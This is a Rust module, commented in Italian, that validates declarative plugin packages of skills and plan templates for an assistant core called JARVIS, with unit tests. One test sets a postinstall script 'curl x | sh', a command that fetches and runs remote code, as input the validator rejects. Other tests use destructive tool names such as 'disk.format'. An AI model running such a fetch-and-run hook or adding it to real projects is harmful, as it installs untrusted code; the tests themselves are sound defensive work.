//! Pacchetti di estensione (ADR-0165): l'SDK di JARVIS è **dichiarativo**. Un pacchetto raggruppa competenze e
//! modelli di piano, scritti in JSON; non contiene codice eseguibile, non usa la rete e non porta chiavi. Il Core lo
//! valida per intero **prima** di installare qualcosa e i suoi componenti restano soggetti a policy, permessi,
//! conferme e audit come se li avesse scritti il proprietario: un pacchetto non può concedersi strumenti,
//! togliere conferme o allargare i permessi.

use serde_json::{json, Value};
use sha2::{Digest, Sha256};

use crate::plans;
use crate::skills;

pub const CONTRACT: &str = "jarvis.plugin/1";
pub const MAX_PACKAGE_BYTES: usize = 64 * 1024;
pub const MAX_SKILLS: usize = 10;
pub const MAX_TEMPLATES: usize = 10;
pub const MAX_PLUGINS: usize = 20;

pub fn valid_name(name: &str) -> bool {
    (2..=30).contains(&name.len())
        && name
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
        && !name.starts_with('-')
        && !name.ends_with('-')
}

fn valid_version(v: &str) -> bool {
    let parts: Vec<&str> = v.split('.').collect();
    parts.len() == 3
        && parts
            .iter()
            .all(|p| !p.is_empty() && p.len() <= 6 && p.bytes().all(|b| b.is_ascii_digit()))
}

/// Impronta del pacchetto (SHA-256 del JSON canonico): finisce nell'audit e nell'elenco, per riconoscere
/// quale versione è installata.
pub fn digest(package: &Value) -> String {
    hex::encode(Sha256::digest(
        serde_json::to_vec(package).unwrap_or_default(),
    ))
}

/// Pacchetto validato e normalizzato: nome, versione, descrizione, competenze valide e modelli con nome
/// prefissato dal pacchetto (`<pacchetto>-<modello>`).
pub fn validate(package: &Value, known_tool: &dyn Fn(&str) -> bool) -> Result<Value, String> {
    if package.to_string().len() > MAX_PACKAGE_BYTES {
        return Err(format!(
            "Il pacchetto supera {} KiB",
            MAX_PACKAGE_BYTES / 1024
        ));
    }
    if package["contract"] != CONTRACT {
        return Err(format!("«contract» deve essere «{CONTRACT}»"));
    }
    let name = package["name"].as_str().unwrap_or_default();
    if !valid_name(name) {
        return Err("«name»: da 2 a 30 caratteri a-z, 0-9 e trattino (non agli estremi)".into());
    }
    let version = package["version"].as_str().unwrap_or_default();
    if !valid_version(version) {
        return Err("«version» deve essere nel formato 1.2.3".into());
    }
    let description = package["description"].as_str().unwrap_or_default().trim();
    if description.chars().count() > 200 {
        return Err("«description» supera 200 caratteri".into());
    }
    // Solo campi noti: nulla di eseguibile o inatteso passa in silenzio.
    if let Some(object) = package.as_object() {
        const KNOWN: [&str; 7] = [
            "contract",
            "name",
            "version",
            "description",
            "author",
            "skills",
            "plan_templates",
        ];
        if let Some(extra) = object.keys().find(|k| !KNOWN.contains(&k.as_str())) {
            return Err(format!(
                "Campo non ammesso: «{extra}» (un pacchetto contiene solo competenze e modelli di piano)"
            ));
        }
    }
    let author: String = package["author"]
        .as_str()
        .unwrap_or_default()
        .trim()
        .chars()
        .take(80)
        .collect();
    let list = |key: &str, max: usize| -> Result<Vec<Value>, String> {
        match package.get(key) {
            None | Some(Value::Null) => Ok(Vec::new()),
            Some(Value::Array(a)) if a.len() <= max => Ok(a.clone()),
            Some(Value::Array(_)) => Err(format!("«{key}»: al massimo {max}")),
            Some(_) => Err(format!("«{key}» deve essere una lista")),
        }
    };
    let mut skills_out = Vec::new();
    for skill in list("skills", MAX_SKILLS)? {
        let mut valid = skills::validate(&skill, known_tool).map_err(|e| {
            format!(
                "Competenza «{}»: {e}",
                skill["name"].as_str().unwrap_or("?")
            )
        })?;
        valid["enabled"] = json!(skill["enabled"].as_bool().unwrap_or(true));
        skills_out.push(valid);
    }
    let mut templates_out: Vec<Value> = Vec::new();
    for template in list("plan_templates", MAX_TEMPLATES)? {
        let local = template["name"].as_str().unwrap_or_default();
        if !valid_name(local) {
            return Err(format!(
                "Modello «{local}»: nome non valido (a-z, 0-9, trattino)"
            ));
        }
        let full = format!("{name}-{local}");
        if full.len() > 40 {
            return Err(format!(
                "Modello «{local}»: il nome con il prefisso supera 40 caratteri"
            ));
        }
        if templates_out.iter().any(|t| t["name"] == full.as_str()) {
            return Err(format!("Modello duplicato: «{local}»"));
        }
        // Si valida istanziando il modello con un valore segnaposto per ogni parametro.
        let mut sample = serde_json::Map::new();
        for spec in template["params"].as_array().into_iter().flatten() {
            if let Some(p) = spec["name"].as_str() {
                sample.insert(p.to_string(), json!("x"));
            }
        }
        let plan = plans::instantiate(&template, &Value::Object(sample))
            .map_err(|e| format!("Modello «{local}»: {e}"))?;
        for step in plan["steps"].as_array().into_iter().flatten() {
            for tool in [step["tool"].as_str(), step["undo"]["tool"].as_str()]
                .into_iter()
                .flatten()
            {
                if !known_tool(tool) {
                    return Err(format!("Modello «{local}»: strumento sconosciuto «{tool}»"));
                }
            }
        }
        templates_out.push(json!({
            "name": full,
            "description": template["description"].as_str().unwrap_or_default().chars().take(200).collect::<String>(),
            "params": template["params"].clone(),
            "goal": template["goal"].clone(),
            "steps": template["steps"].clone(),
            "plugin": name,
        }));
    }
    if skills_out.is_empty() && templates_out.is_empty() {
        return Err("Il pacchetto è vuoto: aggiungi almeno una competenza o un modello".into());
    }
    Ok(json!({
        "name": name, "version": version, "description": description, "author": author,
        "skills": skills_out, "plan_templates": templates_out, "digest": digest(package),
    }))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn known(t: &str) -> bool {
        matches!(t, "math.calc" | "text.count" | "git.status")
    }

    fn package() -> Value {
        json!({"contract": CONTRACT, "name": "ambiente-dev", "version": "1.0.0",
            "description": "Strumenti per lo sviluppo", "author": "Prova",
            "skills": [{"name": "Controllo repository", "instructions": "Controlla lo stato del repository.",
                "triggers": ["stato repo"], "tools": ["git.status"]}],
            "plan_templates": [{"name": "calcola", "description": "Calcolo", "goal": "Calcola {{espressione}}",
                "params": [{"name": "espressione", "required": true}],
                "steps": [{"id": "c", "tool": "math.calc", "arguments": {"expression": "{{espressione}}"}}]}]})
    }

    #[test]
    fn a_valid_package_is_normalized_and_templates_get_the_package_prefix() {
        let out = validate(&package(), &known).unwrap();
        assert_eq!(out["name"], "ambiente-dev");
        assert_eq!(out["plan_templates"][0]["name"], "ambiente-dev-calcola");
        assert_eq!(out["plan_templates"][0]["plugin"], "ambiente-dev");
        assert_eq!(out["skills"][0]["tools"][0], "git.status");
        assert_eq!(out["digest"].as_str().unwrap().len(), 64);
        assert_eq!(
            out["digest"],
            validate(&package(), &known).unwrap()["digest"],
            "stabile"
        );
    }

    #[test]
    fn unknown_tools_unknown_fields_and_bad_names_are_rejected() {
        let mut p = package();
        p["skills"][0]["tools"] = json!(["rm.tutto"]);
        assert!(validate(&p, &known)
            .unwrap_err()
            .contains("strumento sconosciuto"));
        let mut p = package();
        p["plan_templates"][0]["steps"][0]["tool"] = json!("disk.format");
        assert!(validate(&p, &known)
            .unwrap_err()
            .contains("strumento sconosciuto"));
        let mut p = package();
        p["scripts"] = json!({"postinstall": "curl x | sh"});
        assert!(validate(&p, &known)
            .unwrap_err()
            .contains("Campo non ammesso"));
        for name in ["", "A", "-x", "x-", "ha spazi", "x".repeat(31).as_str()] {
            let mut p = package();
            p["name"] = json!(name);
            assert!(validate(&p, &known).is_err(), "{name}");
        }
        let mut p = package();
        p["version"] = json!("1.0");
        assert!(validate(&p, &known).is_err());
        let mut p = package();
        p["contract"] = json!("altro/1");
        assert!(validate(&p, &known).is_err());
    }

    #[test]
    fn limits_empty_packages_and_broken_templates_are_rejected() {
        let mut p = package();
        p["skills"] = json!([]);
        p["plan_templates"] = json!([]);
        assert!(validate(&p, &known).unwrap_err().contains("vuoto"));
        let mut p = package();
        p["plan_templates"][0]["steps"][0]["depends_on"] = json!(["fantasma"]);
        assert!(validate(&p, &known).is_err());
        let mut p = package();
        p["plan_templates"] = json!([
            p["plan_templates"][0].clone(),
            p["plan_templates"][0].clone()
        ]);
        assert!(validate(&p, &known).unwrap_err().contains("duplicato"));
        let mut p = package();
        p["description"] = json!("x".repeat(201));
        assert!(validate(&p, &known).is_err());
        let mut p = package();
        p["skills"][0]["instructions"] = json!("y".repeat(MAX_PACKAGE_BYTES));
        assert!(validate(&p, &known).unwrap_err().contains("KiB"));
    }
}
